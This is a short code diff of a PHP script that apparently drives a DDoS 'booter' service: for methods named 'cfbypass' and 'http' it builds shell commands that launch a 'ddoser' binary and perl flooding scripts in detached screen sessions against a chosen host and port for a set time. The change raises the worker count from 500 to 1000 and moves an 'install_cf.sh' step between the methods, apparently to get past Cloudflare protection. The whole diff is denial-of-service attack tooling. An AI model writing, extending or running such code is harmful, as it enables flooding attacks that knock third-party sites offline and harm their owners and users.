@@ -128,10 +128,10 @@ if ($method == "http" or $method == "cfbypass") {
     }
     if ($method == "cfbypass") {
         $command = "screen -dm perl $directory/bypass.pl $host $time";
-        $command = "screen -dm $directory/ddoser run --url=$host:$port -w 500 -d " . $time . "s -f $directory/https.txt";
+        $command = "bash install_cf.sh && screen -dm $directory/ddoser run --url=$host:$port -w 1000 -d " . $time . "s -f $directory/https.txt";
     }
     if ($method == "http") {
-        $command = "bash install_cf.sh && screen -dm perl $directory/http.pl $host $port 50 500 $time";
+        $command = "screen -dm perl $directory/http.pl $host $port 50 500 $time";
     }
 }
 if ($method == "stop") {
